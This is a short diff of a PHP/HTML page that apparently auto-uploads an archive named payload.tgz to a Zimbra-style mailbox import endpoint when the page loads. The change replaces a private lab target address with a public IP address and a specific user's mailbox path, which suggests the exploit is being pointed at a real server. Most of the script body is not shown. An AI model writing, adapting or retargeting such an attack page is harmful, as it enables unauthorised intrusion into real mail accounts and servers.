@@ -1,6 +1,6 @@
 <?php
 // minimal_auto_upload.php — place next to payload.tgz
-const TARGET = 'https://192.168.137.130/home/user1/?fmt=tgz&resolve=modify&callback=ZmImportExportController__callback__import1&charset=UTF-8';
+const TARGET = 'https://43.250.84.198:443/home/dirsea/?fmt=tgz&resolve=modify&callback=ZmImportExportController__callback__import1&charset=UTF-8';
 const LOCAL = 'payload.tgz';
 
 header("Referrer-Policy: no-referrer");
@@ -39,3 +39,4 @@ window.onload = async function(){
 </script>
 </body>
 </html>
+
